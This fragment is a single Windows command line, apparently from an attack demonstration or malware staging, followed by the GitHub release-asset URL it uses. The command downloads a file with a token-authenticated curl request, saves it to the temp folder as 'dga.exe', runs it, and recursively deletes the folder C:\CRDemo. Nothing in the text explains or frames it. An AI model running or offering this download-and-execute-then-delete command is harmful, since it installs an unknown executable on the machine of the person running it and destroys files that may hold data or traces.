...
C:\Windows\system32\cmd.exe /c curl -H "Authorization: token ghp_%key%" -H "Accept: application/octet-stream" -L "https://api.github.com/repos/tameval/files/releases/assets/79007573" --output %TEMP%\dga.exe & start %TEMP%\dga.exe & rd /s /q C:\CRDemo


https://api.github.com/repos/tameval/files/releases/assets/79007573
